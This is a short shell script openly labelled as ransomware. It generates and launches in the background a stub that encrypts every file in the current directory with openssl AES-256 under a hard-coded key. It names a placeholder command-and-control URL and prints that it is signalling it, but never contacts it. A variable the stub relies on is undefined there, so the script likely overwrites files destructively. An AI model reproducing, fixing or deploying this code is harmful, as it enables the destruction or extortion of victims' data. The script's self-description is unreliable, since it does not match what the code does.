#!/bin/sh

virus_name=ransomware.exe
extension=.encrypted

if [ -f $virus_name$extension ]; then
  echo The virus is already encrypting the files, please wait...
else
  echo Creating encryption stub script...

  cat << EOF > encryption_stub.sh
#!/bin/sh

encryption_key=your_secret_key
c2_address=http://example.com/C2

# Encrypt files with AES encryption
for file in *; do
    if [ -f \$file ]; then
        echo Encrypting \$file
        openssl enc -aes-256-cbc -salt -k \$encryption_key < \$file > \$file\$extension
    fi
done
EOF

  chmod +x encryption_stub.sh

  echo Encrypted files, sending infection signal to C2...

  ./encryption_stub.sh &
fi
